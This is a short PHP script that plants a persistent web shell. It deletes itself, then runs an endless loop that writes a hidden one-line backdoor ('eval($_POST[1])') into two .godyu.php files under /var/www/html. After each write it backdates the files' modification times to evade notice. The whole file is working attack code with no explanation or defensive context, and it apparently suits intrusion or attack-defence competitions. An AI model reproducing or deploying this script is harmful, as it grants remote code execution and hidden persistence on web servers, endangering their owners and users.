<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = '/var/www/html/app/home/.godyu.php';
$file1 = '/var/www/html/book/.godyu.php'; 
$code = '<?php eval($_POST[1]); ?>';

while (1){
    file_put_contents($file,$code);
    system('touch -m -d "2020-12-01 18:10:12" ' . $file);
    file_put_contents($file1,$code);
    system('touch -m -d "2020-12-01 18:10:12" ' . $file1);
    usleep(50000);
}
?>